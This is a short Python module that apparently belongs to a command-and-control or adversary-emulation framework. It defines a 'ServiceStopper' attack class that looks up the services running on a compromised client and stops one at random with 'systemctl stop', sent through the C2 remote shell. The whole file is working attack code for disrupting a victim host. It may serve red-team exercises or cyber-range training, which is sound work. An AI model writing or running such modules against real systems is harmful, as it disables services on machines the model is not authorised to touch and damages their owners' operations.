from __future__ import annotations
from typing import TYPE_CHECKING
if TYPE_CHECKING:
    from Operations.Client import C2Client
    from Operations.Operation import Operation
from Attacks.Attack import Attack
import random
import requests
from Data.Techniques.ClientData import ClientData
import random

class ServiceStopper(Attack):
    def meetsPreReqs(clientData: ClientData):
        empty = len(clientData.servicesData.getServicesData()) == 0
        return (not empty)
    
    async def execute(self, c2client: C2Client, operation: Operation):
        possibleServices = []
        ipAddress = await c2client.getIPAddress()
        for clientdata in operation.clientsData.getClientsData():
            if(clientdata.ipAddress == ipAddress):
                for service in clientdata.servicesData.getServicesData():
                    possibleServices.append(service.name)
        
        await c2client.executeShell("systemctl stop %s" % random.choice(possibleServices))